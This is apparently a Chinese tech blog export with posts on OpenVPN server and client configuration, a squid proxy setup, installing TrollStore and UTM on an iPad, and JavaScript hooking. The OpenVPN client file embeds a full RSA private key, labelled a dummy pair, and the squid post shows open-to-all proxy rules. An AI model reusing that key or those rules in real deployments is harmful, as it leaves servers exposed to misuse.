;route 10.9.0.0 255.255.255.252
# Then add this line to ccd/Thelonious:
#   ifconfig-push 10.9.0.1 10.9.0.2

# Suppose that you want to enable different
# firewall access policies for different groups
# of clients.  There are two methods:
# (1) Run multiple OpenVPN daemons, one for each
#     group, and firewall the TUN/TAP interface
#     for each group/daemon appropriately.
# (2) (Advanced) Create a script to dynamically
#     modify the firewall in response to access
#     from different clients.  See man
#     page for more info on learn-address script.
;learn-address ./script

# If enabled, this directive will configure
# all clients to redirect their default
# network gateway through the VPN, causing
# all IP traffic such as web browsing and
# and DNS lookups to go through the VPN
# (The OpenVPN server machine may need to NAT
# or bridge the TUN/TAP interface to the internet
# in order for this to work properly).
push &quot;redirect-gateway def1 bypass-dhcp&quot;

# Certain Windows-specific network settings
# can be pushed to clients, such as DNS
# or WINS server addresses.  CAVEAT:
# http://openvpn.net/faq.html#dhcpcaveats
# The addresses below refer to the public
# DNS servers provided by opendns.com.
push &quot;dhcp-option DNS 114.114.114.114&quot;
push &quot;dhcp-option DNS 8.8.8.8&quot;

# Uncomment this directive to allow different
# clients to be able to &quot;see&quot; each other.
# By default, clients will only see the server.
# To force clients to only see the server, you
# will also need to appropriately firewall the
# server&#39;s TUN/TAP interface.
client-to-client

# Uncomment this directive if multiple clients
# might connect with the same certificate/key
# files or common names.  This is recommended
# only for testing purposes.  For production use,
# each client should have its own certificate/key
# pair.
#
# IF YOU HAVE NOT GENERATED INDIVIDUAL
# CERTIFICATE/KEY PAIRS FOR EACH CLIENT,
# EACH HAVING ITS OWN UNIQUE &quot;COMMON NAME&quot;,
# UNCOMMENT THIS LINE OUT.
duplicate-cn

# The keepalive directive causes ping-like
# messages to be sent back and forth over
# the link so that each side knows when
# the other side has gone down.
# Ping every 10 seconds, assume that remote
# peer is down if no ping received during
# a 120 second time period.
keepalive 10 120

# For extra security beyond that provided
# by SSL/TLS, create an &quot;HMAC firewall&quot;
# to help block DoS attacks and UDP port flooding.
#
# Generate with:
#   openvpn --genkey --secret ta.key
#
# The server and each client must have
# a copy of this key.
# The second parameter should be &#39;0&#39;
# on the server and &#39;1&#39; on the clients.
;tls-auth ta.key 0 # This file is secret

# Select a cryptographic cipher.
# This config item must be copied to
# the client config file as well.
;cipher BF-CBC        # Blowfish (default)
;cipher AES-128-CBC   # AES
;cipher DES-EDE3-CBC  # Triple-DES

# Enable compression on the VPN link.
# If you enable it here, you must also
# enable it in the client config file.
comp-lzo

# The maximum number of concurrently connected
# clients we want to allow.
;max-clients 100

# It&#39;s a good idea to reduce the OpenVPN
# daemon&#39;s privileges after initialization.
#
# You can uncomment this out on
# non-Windows systems.
user nobody
group nogroup

# The persist options will try to avoid
# accessing certain resources on restart
# that may no longer be accessible because
# of the privilege downgrade.
persist-key
persist-tun

# Output a short status file showing
# current connections, truncated
# and rewritten every minute.
status openvpn-status.log

# By default, log messages will go to the syslog (or
# on Windows, if running as a service, they will go to
# the &quot;\Program Files\OpenVPN\log&quot; directory).
# Use log or log-append to override this default.
# &quot;log&quot; will truncate the log file on OpenVPN startup,
# while &quot;log-append&quot; will append to it.  Use one
# or the other (but not both).
log         /var/log/openvpn.log
log-append  /var/log/openvpn.log

# Set the appropriate level of log
# file verbosity.
#
# 0 is silent, except for fatal errors
# 4 is reasonable for general usage
# 5 and 6 can help to debug connection problems
# 9 is extremely verbose
verb 3

# Silence repeating messages.  At most 20
# sequential messages of the same message
# category will be output to the log.
;mute 20
</code></pre><blockquote>
<p>server 192.168.1.0 255.255.255.0</p>
</blockquote>
<p>这行可以根据期望分配的ip段进行相应修改。</p>
<h2 id="0x03-开启iptables的NAT功能"><a href="#0x03-开启iptables的NAT功能" class="headerlink" title="0x03 开启iptables的NAT功能"></a>0x03 开启iptables的NAT功能</h2><h3 id="开启ip数据包转发"><a href="#开启ip数据包转发" class="headerlink" title="开启ip数据包转发"></a>开启ip数据包转发</h3><p>修改/etc/sysctl.conf文件，去掉<code>#net.ipv4.ip_forward=1</code>前面的<code>#</code>，并保存</p>
<blockquote>
<p>sysctl –p</p>
</blockquote>
<p>这样就开启了ip数据包转发功能，从而支持在多个网卡间转发数据。</p>
<h3 id="配置NAT转发规则"><a href="#配置NAT转发规则" class="headerlink" title="配置NAT转发规则"></a>配置NAT转发规则</h3><blockquote>
<p>iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j MASQUERADE</p>
</blockquote>
<p>将所有来自VPN网段的数据都转发到eth0网卡，并修改源ip为eth0的网卡ip。</p>
<h3 id="开启防火墙策略"><a href="#开启防火墙策略" class="headerlink" title="开启防火墙策略"></a>开启防火墙策略</h3><blockquote>
<p>iptables -A INPUT -p UDP –dport 1194 -j ACCEPT</p>
</blockquote>
<p>此外，还要在腾讯云的云主机控制台中增加入站规则。</p>
<h2 id="0x04-开启服务"><a href="#0x04-开启服务" class="headerlink" title="0x04 开启服务"></a>0x04 开启服务</h2><blockquote>
<p>systemctl start openvpn@server<br>systemctl enable openvpn@server</p>
</blockquote>
<h2 id="0x05-测试OpenVPN客户端"><a href="#0x05-测试OpenVPN客户端" class="headerlink" title="0x05 测试OpenVPN客户端"></a>0x05 测试OpenVPN客户端</h2><p>下载Windows版的OpenVPN安装程序，安装到系统中。</p>
<p>将前面生成的ca.crt、client.crt、client.key三个文件拷贝到电脑中，如：D:\openvpn目录。</p>
<p>将安装目录下sample-config目录中的client.ovpn文件拷贝到config目录下，并修改服务端ip和证书路径配置。</p>
<p>修改后的client.ovpn内容如下：</p>
<pre><code>##############################################
# Sample client-side OpenVPN 2.0 config file #
# for connecting to multi-client server.     #
#                                            #
# This configuration can be used by multiple #
# clients, however each client should have   #
# its own cert and key files.                #
#                                            #
# On Windows, you might want to rename this  #
# file so it has a .ovpn extension           #
##############################################

# Specify that we are a client and that we
# will be pulling certain config file directives
# from the server.
client

# Use the same setting as you are using on
# the server.
# On most systems, the VPN will not function
# unless you partially or fully disable
# the firewall for the TUN/TAP interface.
;dev tap
dev tun

# Windows needs the TAP-Win32 adapter name
# from the Network Connections panel
# if you have more than one.  On XP SP2,
# you may need to disable the firewall
# for the TAP adapter.
;dev-node MyTap

# Are we connecting to a TCP or
# UDP server?  Use the same setting as
# on the server.
;proto tcp
proto udp

# The hostname/IP and port of the server.
# You can have multiple remote entries
# to load balance between the servers.
remote 1.2.3.4 1194
;remote my-server-2 1194

# Choose a random host from the remote
# list for load-balancing.  Otherwise
# try hosts in the order specified.
;remote-random

# Keep trying indefinitely to resolve the
# host name of the OpenVPN server.  Very useful
# on machines which are not permanently connected
# to the internet such as laptops.
resolv-retry infinite

# Most clients don&#39;t need to bind to
# a specific local port number.
nobind

# Downgrade privileges after initialization (non-Windows only)
;user nobody
;group nobody

# Try to preserve some state across restarts.
persist-key
persist-tun

# If you are connecting through an
# HTTP proxy to reach the actual OpenVPN
# server, put the proxy server/IP and
# port number here.  See the man page
# if your proxy server requires
# authentication.
;http-proxy-retry # retry on connection failures
;http-proxy [proxy server] [proxy port #]

# Wireless networks often produce a lot
# of duplicate packets.  Set this flag
# to silence duplicate packet warnings.
;mute-replay-warnings

# SSL/TLS parms.
# See the server config file for more
# description.  It&#39;s best to use
# a separate .crt/.key file pair
# for each client.  A single ca
# file can be used for all clients.
ca D:\\openvpn\\ca.crt
cert D:\\openvpn\\client.crt
key D:\\openvpn\\client.key

# Verify server certificate by checking that the
# certicate has the correct key usage set.
# This is an important precaution to protect against
# a potential attack discussed here:
#  http://openvpn.net/howto.html#mitm
#
# To use this feature, you will need to generate
# your server certificates with the keyUsage set to
#   digitalSignature, keyEncipherment
# and the extendedKeyUsage to
#   serverAuth
# EasyRSA can do this for you.
remote-cert-tls server

# If a tls-auth key is used on the server
# then every client must also have the key.
;tls-auth ta.key 1

# Select a cryptographic cipher.
# If the cipher option is used on the server
# then you must also specify it here.
;cipher x

# Enable compression on the VPN link.
# Don&#39;t enable this unless it is also
# enabled in the server config file.
comp-lzo

# Set log file verbosity.
verb 3

# Silence repeating messages
;mute 20
</code></pre><p>还有一种把证书插入到ovpn文件中的写法，这样可以不用额外提供三个证书文件。</p>
<p>去掉client.ovpn文件中的以下三行：</p>
<blockquote>
<p>ca D:\openvpn\ca.crt<br>    cert D:\openvpn\client.crt<br>    key D:\openvpn\client.key</p>
</blockquote>
<p>并在文件末尾加入以下内容：</p>
<pre><code>###############################################################################
# The certificate file of the destination VPN Server.
# 
# The CA certificate file is embedded in the inline format.
# You can replace this CA contents if necessary.
# Please note that if the server certificate is not a self-signed, you have to
# specify the signer&#39;s root certificate (CA) here.

&lt;ca&gt;
-----BEGIN CERTIFICATE-----
MIIDAzCCAeugAwIBAgIEEUA4CTANBgkqhkiG9w0BAQsFADA5MRMwEQYDVQQDDAo0
NzFiY2p5LmpwMRUwEwYDVQQKDAxudTU4NW92IHIxaGwxCzAJBgNVBAYTAlVTMB4X
DTE2MDIyOTAyNDQxNloXDTIzMDQyMDAyNDQxNlowOTETMBEGA1UEAwwKNDcxYmNq
eS5qcDEVMBMGA1UECgwMbnU1ODVvdiByMWhsMQswCQYDVQQGEwJVUzCCASIwDQYJ
KoZIhvcNAQEBBQADggEPADCCAQoCggEBAPLuy9Hppm1GGFOtpuMJ3fcj1RsHxoMc
Enr721gq8eYOsddULlMRv5IJMIQZb+8g0mmcZAw4x7Rl3YCptopjrVDDYDl4Ul3y
OwG1EfKJiqGlXM5asdMgk6tU/oB7RMGtjLzVcNSOge24+PigrsRQLS3WcEHX0q6F
WdsvPVnbUzceoug/l+zkA8IVf2eFna9x0WldwjLqJAbcL6YILSKHTpHw40yl44+R
/LBNNVvuUWyVm8FReMbQf0tkRqvl+ZRlpnb3pQ68FWhXfwE9nZD/hbbjcmgf9bMg
cEDI72pCqlw00QodnhwPQJVnhRFQr1u7aMEdXyBzGpdfdOY8GAPP2KkCAwEAAaMT
MBEwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAOG1qYZLpLhmr
WJMMht7ktkWtLD33DUjimS0hj3Z90JsHE/Vwlqi4c+AQUtw2dX/ZfGTRj83aK/cA
GGQ5lW4HudNi6yCr40Ekl7EVeNAUQ+DM8TpAgYq8Hr/qVDGZDCxu61iaR/Qugh4P
qM4YHLlJO140WXto0w3T4SkDGbIsiJnCsUOMzjStRIhKyXl+K62ozuuZAAW6vRTe
kxz9+IHYc/kbAwoU009u+V11mtIzGvJaXhx95YaZX1nkqbH03pdgb4TcG41nXEmE
t7BXXGira4UJmLD8t7VK0LRlmZ+9X2NB5URima6yB23UAILDIX4371QFDvbo8px5
Cym58IyGLA==
-----END CERTIFICATE-----

&lt;/ca&gt;


###############################################################################
# The client certificate file (dummy).
# 
# In some implementations of OpenVPN Client software
# (for example: OpenVPN Client for iOS),
# a pair of client certificate and private key must be included on the
# configuration file due to the limitation of the client.
# So this sample configuration file has a dummy pair of client certificate
# and private key as follows.

&lt;cert&gt;
-----BEGIN CERTIFICATE-----
MIICxjCCAa4CAQAwDQYJKoZIhvcNAQEFBQAwKTEaMBgGA1UEAxMRVlBOR2F0ZUNs
aWVudENlcnQxCzAJBgNVBAYTAkpQMB4XDTEzMDIxMTAzNDk0OVoXDTM3MDExOTAz
MTQwN1owKTEaMBgGA1UEAxMRVlBOR2F0ZUNsaWVudENlcnQxCzAJBgNVBAYTAkpQ
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5h2lgQQYUjwoKYJbzVZA
5VcIGd5otPc/qZRMt0KItCFA0s9RwReNVa9fDRFLRBhcITOlv3FBcW3E8h1Us7RD
4W8GmJe8zapJnLsD39OSMRCzZJnczW4OCH1PZRZWKqDtjlNca9AF8a65jTmlDxCQ
CjntLIWk5OLLVkFt9/tScc1GDtci55ofhaNAYMPiH7V8+1g66pGHXAoWK6AQVH67
XCKJnGB5nlQ+HsMYPV/O49Ld91ZN/2tHkcaLLyNtywxVPRSsRh480jju0fcCsv6h
p/0yXnTB//mWutBGpdUlIbwiITbAmrsbYnjigRvnPqX1RNJUbi9Fp6C2c/HIFJGD
ywIDAQABMA0GCSqGSIb3DQEBBQUAA4IBAQChO5hgcw/4oWfoEFLu9kBa1B//kxH8
hQkChVNn8BRC7Y0URQitPl3DKEed9URBDdg2KOAz77bb6ENPiliD+a38UJHIRMqe
UBHhllOHIzvDhHFbaovALBQceeBzdkQxsKQESKmQmR832950UCovoyRB61UyAV7h
+mZhYPGRKXKSJI6s0Egg/Cri+Cwk4bjJfrb5hVse11yh4D9MHhwSfCOH+0z4hPUT
Fku7dGavURO5SVxMn/sL6En5D+oSeXkadHpDs+Airym2YHh15h0+jPSOoR6yiVp/
6zZeZkrN43kuS73KpKDFjfFPh8t4r1gOIjttkNcQqBccusnplQ7HJpsk
-----END CERTIFICATE-----

&lt;/cert&gt;

&lt;key&gt;
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA5h2lgQQYUjwoKYJbzVZA5VcIGd5otPc/qZRMt0KItCFA0s9R
wReNVa9fDRFLRBhcITOlv3FBcW3E8h1Us7RD4W8GmJe8zapJnLsD39OSMRCzZJnc
zW4OCH1PZRZWKqDtjlNca9AF8a65jTmlDxCQCjntLIWk5OLLVkFt9/tScc1GDtci
55ofhaNAYMPiH7V8+1g66pGHXAoWK6AQVH67XCKJnGB5nlQ+HsMYPV/O49Ld91ZN
/2tHkcaLLyNtywxVPRSsRh480jju0fcCsv6hp/0yXnTB//mWutBGpdUlIbwiITbA
mrsbYnjigRvnPqX1RNJUbi9Fp6C2c/HIFJGDywIDAQABAoIBAERV7X5AvxA8uRiK
k8SIpsD0dX1pJOMIwakUVyvc4EfN0DhKRNb4rYoSiEGTLyzLpyBc/A28Dlkm5eOY
fjzXfYkGtYi/Ftxkg3O9vcrMQ4+6i+uGHaIL2rL+s4MrfO8v1xv6+Wky33EEGCou
QiwVGRFQXnRoQ62NBCFbUNLhmXwdj1akZzLU4p5R4zA3QhdxwEIatVLt0+7owLQ3
lP8sfXhppPOXjTqMD4QkYwzPAa8/zF7acn4kryrUP7Q6PAfd0zEVqNy9ZCZ9ffho
zXedFj486IFoc5gnTp2N6jsnVj4LCGIhlVHlYGozKKFqJcQVGsHCqq1oz2zjW6LS
oRYIHgECgYEA8zZrkCwNYSXJuODJ3m/hOLVxcxgJuwXoiErWd0E42vPanjjVMhnt
KY5l8qGMJ6FhK9LYx2qCrf/E0XtUAZ2wVq3ORTyGnsMWre9tLYs55X+ZN10Tc75z
4hacbU0hqKN1HiDmsMRY3/2NaZHoy7MKnwJJBaG48l9CCTlVwMHocIECgYEA8jby
dGjxTH+6XHWNizb5SRbZxAnyEeJeRwTMh0gGzwGPpH/sZYGzyu0SySXWCnZh3Rgq
5uLlNxtrXrljZlyi2nQdQgsq2YrWUs0+zgU+22uQsZpSAftmhVrtvet6MjVjbByY
DADciEVUdJYIXk+qnFUJyeroLIkTj7WYKZ6RjksCgYBoCFIwRDeg42oK89RFmnOr
LymNAq4+2oMhsWlVb4ejWIWeAk9nc+GXUfrXszRhS01mUnU5r5ygUvRcarV/T3U7
TnMZ+I7Y4DgWRIDd51znhxIBtYV5j/C/t85HjqOkH+8b6RTkbchaX3mau7fpUfds
Fq0nhIq42fhEO8srfYYwgQKBgQCyhi1N/8taRwpk+3/IDEzQwjbfdzUkWWSDk9Xs
H/pkuRHWfTMP3flWqEYgW/LW40peW2HDq5imdV8+AgZxe/XMbaji9Lgwf1RY005n
KxaZQz7yqHupWlLGF68DPHxkZVVSagDnV/sztWX6SFsCqFVnxIXifXGC4cW5Nm9g
va8q4QKBgQCEhLVeUfdwKvkZ94g/GFz731Z2hrdVhgMZaU/u6t0V95+YezPNCQZB
wmE9Mmlbq1emDeROivjCfoGhR3kZXW1pTKlLh6ZMUQUOpptdXva8XxfoqQwa3enA
M7muBbF0XN7VO80iJPv+PmIZdEIAkpwKfi201YB+BafCIuGxIF50Vg==
-----END RSA PRIVATE KEY-----

&lt;/key&gt;
</code></pre><p>请根据具体服务器配置修改对应的内容。</p>
<p>打开OpenVPN GUI，选择刚才添加的配置项，进行连接。连接成功后，图标会从灰色变成绿色。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>OpenVPN</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu部署squid代理服务器</title>
    <url>/2019/01/28/install-squid-server/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><code>squid</code>是一款高性能的代理缓存服务器，常用来部署<code>HTTP(S)</code>代理服务器。本文是在<code>Ubuntu</code>上使用<code>squid</code>部署<code>HTTP(S)</code>代理服务器的方法总结。</p>
<p>使用的Ubuntu版本是：<code>Ubuntu 16.04 x64</code>。</p>
<h1 id="0x01-安装和配置"><a href="#0x01-安装和配置" class="headerlink" title="0x01 安装和配置"></a>0x01 安装和配置</h1><p>使用如下命令安装<code>squid</code>：</p>
<pre><code>apt install squid -y
</code></pre><p>安装后，会在<code>/etc/squid</code>目录下生成默认的配置文件<code>squid.conf</code>,需要对其做一些自定义的修改.</p>
<h2 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h2><p>将<code>http_port 3128</code>这行中的<code>3128</code>修改为期望的端口号，比如<code>8080</code>，或是非常用端口，这样可以避免服务被<a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a>之类的搜索引擎探测到。</p>
<h2 id="允许外部访问"><a href="#允许外部访问" class="headerlink" title="允许外部访问"></a>允许外部访问</h2><p>squid默认只能从本地访问，是因为它设置了<code>http_access allow localhost</code>。</p>
<p>但正常情况下，我们都是需要从外部访问的，这就需要添加以下两行配置：</p>
<pre><code>acl net src 0.0.0.0/0
http_access allow net
</code></pre><p>表示接收任意外部地址。</p>
<h2 id="允许CONNECT所有端口"><a href="#允许CONNECT所有端口" class="headerlink" title="允许CONNECT所有端口"></a>允许<code>CONNECT</code>所有端口</h2><p>squid默认只可以<code>CONNECT</code>443端口，如果要开放所有端口，需要注释掉<code>http_access deny CONNECT !SSL_ports</code>这行。</p>
<h2 id="修改安全端口"><a href="#修改安全端口" class="headerlink" title="修改安全端口"></a>修改安全端口</h2><p>squid默认策略只允许代理访问以下端口：</p>
<pre><code>acl Safe_ports port 80        # http
acl Safe_ports port 21        # ftp
acl Safe_ports port 443        # https
acl Safe_ports port 70        # gopher
acl Safe_ports port 210        # wais
acl Safe_ports port 1025-65535    # unregistered ports
acl Safe_ports port 280        # http-mgmt
acl Safe_ports port 488        # gss-http
acl Safe_ports port 591        # filemaker
acl Safe_ports port 777        # multiling http
</code></pre><p>因此，会有部分端口无法访问，直接返回<code>403 Forbidden</code>。如果需要访问这些端口，可以增加以下配置：</p>
<pre><code>acl Safe_ports port 1-1024
</code></pre><h2 id="不允许访问本地网络"><a href="#不允许访问本地网络" class="headerlink" title="不允许访问本地网络"></a>不允许访问本地网络</h2><p>squid默认允许访问本地（<code>localhost</code>）服务，但建议去掉<code>#http_access deny to_localhost</code>的注释</p>
<h2 id="允许所有访问"><a href="#允许所有访问" class="headerlink" title="允许所有访问"></a>允许所有访问</h2><p>如果觉得以上操作过于繁琐，在<code>不考虑安全性</code>的情况下，也可以修改<code>http_access deny all</code>为<code>http_access allow all</code></p>
<h2 id="设置访问密码"><a href="#设置访问密码" class="headerlink" title="设置访问密码"></a>设置访问密码</h2><p>为了安全，我们通常会给代理服务器设置密码。</p>
<p>先安装<code>htpasswd</code>工具，使用如下命令：</p>
<pre><code>apt install apache2-utils -y
</code></pre><p>创建密码文件：</p>
<pre><code>htpasswd -c /etc/squid/passwd proxy_username
</code></pre><p>在<code>squid.conf</code>中添加以下内容：</p>
<pre><code>auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwd
</code></pre><h1 id="0x02-启动squid服务"><a href="#0x02-启动squid服务" class="headerlink" title="0x02 启动squid服务"></a>0x02 启动squid服务</h1><pre><code>systemctl start squid
</code></pre>]]></content>
      <tags>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>iPad上使用UTM安装Linux arm64系统</title>
    <url>/2024/01/05/ipad-install-linux/</url>
    <content><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>以前研究过一次在iPad上安装Linux系统，当时的方案是：<a href="https://altstore.io/" target="_blank" rel="noopener">AltStore</a> + <a href="https://github.com/utmapp/UTM" target="_blank" rel="noopener">UTM</a>，由于没有硬件虚拟化，性能非常差，只能安装服务器版Linux，而且UTM由于签名问题需要每7天续签一次，几乎不具有可玩性。</p>
<p>最近看到有帖子说UTM支持硬件虚拟化了，于是稍微研究了一下，上面的两个问题也都解决了。</p>
<h2 id="0x01-基本原理"><a href="#0x01-基本原理" class="headerlink" title="0x01 基本原理"></a>0x01 基本原理</h2><p>解决这两个问题的关键都在一个叫：<a href="https://trollstore.app/" target="_blank" rel="noopener">Trollstore(巨魔)</a>的工具。这个工具最强大的地方在于，可以免越狱安装未签名的应用，其原理是利用了iOS系统的一些安全漏洞，因此，这个工具会iOS版本有要求。例如：Trollstore1只支持<code>14.0 ~ 15.4.1 、15.5 Beta 4</code>版本；Trollstore2支持<code>14 - 16.5</code>（具体支持的系统版本可以看官网介绍）。因此，只要不是太新的系统，都是可以支持的。</p>
<p>现在的问题变成了如何将这个工具安装到设备中，下面以iPad Pro 第三代(系统版本:<code>16.2</code>)为例进行介绍。</p>
<p>基本流程是按照<a href="https://trollstore.app/installing-trollhelper-misaka/" target="_blank" rel="noopener">官方文档</a>进行操作。</p>
<h2 id="0x02-准备工作"><a href="#0x02-准备工作" class="headerlink" title="0x02 准备工作"></a>0x02 准备工作</h2><ul>
<li>将<code>Tips(提示)</code>应用安装到设备中</li>
<li>最新版本的<a href="https://sideloadly.io/" target="_blank" rel="noopener">Sideloadly</a></li>
<li>最新版本的<a href="https://www.apple.com/itunes/download/win32" target="_blank" rel="noopener">iTunes</a>（Windows端）</li>
<li>最新版本的<a href="https://github.com/straight-tamago/misaka/releases/latest" target="_blank" rel="noopener">Misaka</a></li>
</ul>
<p><code>Sideloadly</code>是用来通过<code>侧载</code>方式安装<code>Misaka</code>；而<code>Misaka</code>用来溢出并注入<code>Tips</code>应用，最后打开提示应用，界面就变成了安装<code>Trollstore</code>的界面，点击安装就可以了。</p>
<p>推荐还是使用Mac系统来操作，Windows上可能会有些问题。</p>
<h2 id="0x03-安装Trollstore应用"><a href="#0x03-安装Trollstore应用" class="headerlink" title="0x03 安装Trollstore应用"></a>0x03 安装Trollstore应用</h2><p><code>侧载</code>是指不通过AppStore来安装应用的方式，一般是使用企业证书或开发者证书对ipa文件进行签名，然后进行安装。</p>
<h3 id="使用Sideloadly安装Misaka"><a href="#使用Sideloadly安装Misaka" class="headerlink" title="使用Sideloadly安装Misaka"></a>使用Sideloadly安装Misaka</h3><p>在电脑端下载并安装<a href="https://sideloadly.io/#download" target="_blank" rel="noopener">Sideloadly</a>，并将最新版本的<a href="https://github.com/straight-tamago/misaka/releases/latest" target="_blank" rel="noopener">Misaka</a>ipa文件下载到本地。</p>
<p><img src="https://sideloadly.io/screenshots/sideloadlylogs.png" alt="sideloadly安装ipa示例"></p>
<p>拖入Misaka的ipa文件，输入苹果帐号，然后点击<code>Start</code>，第一次会提示输入帐号密码，完成后Misaka就安装到设备上了。图标如下：</p>
<p><img src="/images/misaka.png" alt></p>
<p>侧载类应用除了sideloadly，还有前面提到的<code>AltStore</code>，以及爱思助手之类的。它们都有一个共同的缺点，就是每7天需要续签一次，基本只能用作开发调试场景。</p>
<h3 id="使用Misaka注入提示应用"><a href="#使用Misaka注入提示应用" class="headerlink" title="使用Misaka注入提示应用"></a>使用Misaka注入提示应用</h3><p>Misaka是一款免越狱就可以对iOS设备进行定制的应用，同时也提供了安装<code>Trollstore</code>的能力。</p>
<p>下面是官方文档推荐的注入方法：</p>
<p><img src="/images/install-trollstore1.jpg" alt></p>
<p>在实际操作过程中遇到了以下两个问题：</p>
<ul>
<li>在上面的第三步操作后提示<code>Done</code>，但是打开<code>提示</code>应用Crash</li>
<li>多操作几次后容易出现<code>Error, please restart your device and try again [A2]</code>报错，网上找到一个方案是安装<code>3.4.1</code>版本的Misaka</li>
</ul>
<p>这个步骤是整个安装过程中最花费时间的，重试了很多次，重启了很多次设备，最终采用的是以下方法搞定的：</p>
<ol>
<li>在<a href="https://github.com/opa334/TrollStore/releases" target="_blank" rel="noopener">这里</a>下载最新版本的<code>PersistenceHelper_Embedded</code>，并拷贝到设备中</li>
<li>点击Misaka底部的<code>FileManager</code>页面，打开到路径<code>/var/containers/Bundle/Application/com.apple.tips/Tips.app</code></li>
<li>找到<code>Tips</code>文件，点击它，然后点击<code>File Overwrite</code>选项，导入<code>PersistenceHelper_Embedded</code>文件覆盖</li>
<li>重启设备</li>
</ol>
<h3 id="打开提示应用，安装Trollstore"><a href="#打开提示应用，安装Trollstore" class="headerlink" title="打开提示应用，安装Trollstore"></a>打开提示应用，安装Trollstore</h3><p>打开<code>提示</code>应用，点击<code>Install Trollstore</code>进行安装，安装完成后，桌面上就会看到Trollstore的图标：</p>
<p><img src="/images/trollstore.jpg" alt></p>
<blockquote>
<p>如果遇到打开<code>提示</code>应用Crash或是设备自动重启等问题，请卸载提示应用再重新安装，并再执行一次上面的步骤。</p>
</blockquote>
<h2 id="0x04-安装UTM应用"><a href="#0x04-安装UTM应用" class="headerlink" title="0x04 安装UTM应用"></a>0x04 安装UTM应用</h2><p><a href="https://docs.getutm.app/installation/ios/#summary" target="_blank" rel="noopener">这里</a>展示了UTM的多个版本：</p>
<ul>
<li>UTM: 标准版，使用JIT方式，性能一般</li>
<li>UTM HV: 开启<code>Hypervisor</code>的版本，支持硬件虚拟化，性能较高（需要是M1 iPad）</li>
<li>UTM SE: 性能较差</li>
</ul>
<p>由于手上的这款是M1芯片，因此选择了<code>UTM HV</code>版本。</p>
<ol>
<li>将<code>UTM HV</code>版本的ipa文件拷贝到设备中</li>
<li>打开Trollstore，选择右上角<code>+</code>号，选择<code>Install IPA File</code>，然后选择刚才拷贝的ipa文件</li>
<li>在弹出的窗口中点击<code>Install</code>，很快就会安装完成</li>
</ol>
<h2 id="0x05-安装Ubuntu-22-04-arm64桌面版"><a href="#0x05-安装Ubuntu-22-04-arm64桌面版" class="headerlink" title="0x05 安装Ubuntu 22.04 arm64桌面版"></a>0x05 安装Ubuntu 22.04 arm64桌面版</h2><p>现在Linux系统的arm生态已经很健全了，基本上常见的应用都有提供对应的arm版本。这里选择了Ubuntu系统，除了生态考虑，还有性能因素，毕竟iPad才8G内存，如果系统本身占用了太多资源的话，留给应用的资源就很有限了。</p>
<ol>
<li>将<a href="https://cdimage.ubuntu.com/jammy/daily-live/current/jammy-desktop-arm64.iso" target="_blank" rel="noopener">镜像ISO</a>文件下载到设备中</li>
<li>打开UTM，点击<code>创建一个新虚拟机</code>，选择<code>虚拟化</code>（这种模式会开启硬件虚拟机）</li>
</ol>
<p><img src="/images/utm-1.png" alt></p>
<ol start="3">
<li>然后选择Linux，添加刚才拷贝进来的iso镜像文件，后面是一些CPU、内存等硬件相关的参数配置</li>
<li>保存后启动虚拟机，开始进行安装，Ubuntu也支持Live方式使用，可以先体验一下</li>
<li>安装完成后进入系统，可以做一些个性化界面优化(访问虚拟机需要外接<code>键盘</code>和<code>鼠标</code>才能操作)</li>
</ol>
<p><img src="/images/utm-ubuntu.png" alt></p>
<p>至此，一个便携式Linux系统已经安装完成，系统操作还是非常流畅的，可以安装上vscode、git、docker等常用工具，轻量级开发也基本没啥问题。</p>
<p>连接上外接显示器，系统操作起来会更加舒服。</p>
<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>iPad上通过免越狱实现硬件虚拟化，极大提升了虚拟机系统操作的流畅性，真正将桌面版系统运行起来。在此基础上，iPad才能真正变成一个开发工具。</p>
<h2 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h2><ul>
<li><a href="https://zhuanlan.zhihu.com/p/627103800" target="_blank" rel="noopener">TrollStore巨魔商店永久安装APP，永不过期</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/574182220" target="_blank" rel="noopener">【IOS】TrollStore 工具——应用免签&amp;&amp;微信双开</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/669206994" target="_blank" rel="noopener">Trollstore2发布了，保姆安装教程~</a></li>
<li><a href="https://www.ipapark.com/6688.html" target="_blank" rel="noopener">TrollStore2 巨魔商店2 使用教程</a></li>
<li><a href="https://sspai.com/post/62092" target="_blank" rel="noopener">用 UTM 虚拟机在 iPad 上运行 Windows 和 Linux，拓展生产力新可能</a></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ipad</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈Javascript中的Hook技术</title>
    <url>/2020/06/05/javascript-hook/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Hook是一种动态修改函数执行流程或返回结果的方法，在实际应用中非常广泛。Javascript作为一种动态语言，也可以进行Hook操作。随着Javascript语言的发展，Hook的方法也越来越多，本文介绍了常见的几种Hook方法。</p>
<h1 id="0x01-最简单的Hook方法"><a href="#0x01-最简单的Hook方法" class="headerlink" title="0x01 最简单的Hook方法"></a>0x01 最简单的Hook方法</h1><p>Javascript中的函数可以直接被覆盖，因此，这也是最简单的一种Hook方法。</p>
<pre><code class="javascript">window.alert = function(s){
    console.log(&#39;Alert: &#39; + s);
}
</code></pre>
<pre><code>&gt; alert(&#39;Hello!&#39;)
